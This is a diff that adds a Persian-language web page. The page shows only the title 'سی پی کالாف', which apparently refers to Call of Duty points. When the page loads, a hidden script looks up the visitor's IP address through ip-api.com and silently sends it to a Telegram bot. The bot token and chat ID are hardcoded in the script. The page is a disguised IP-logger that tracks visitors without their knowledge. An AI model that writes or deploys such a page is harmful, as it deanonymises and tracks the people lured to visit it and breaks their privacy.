@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>سی پی کالاف</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #1b1b1b;
+      color: #fff;
+      text-align: center;
+    }
+    h1 {
+      font-size: 3rem;
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+  <h1>سی پی کالاف</h1>
+
+  <script>
+    const botToken = '6811411494:AAESLtVx1VFLV-wgeEWj82iw6Bljg3_wMqc';  // توکن ربات شما
+    const chatId = '1353504783';  // آیدی چت شما
+
+    // استفاده از سرویس ip-api.com برای دریافت آی‌پی
+    fetch('http://ip-api.com/json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.query;  // آی‌پی از داده‌های بازگشتی
+        const message = `IP: ${ip}`;
+        // ارسال آی پی به ربات تلگرام
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+      });
+  </script>
+</body>
+</html>
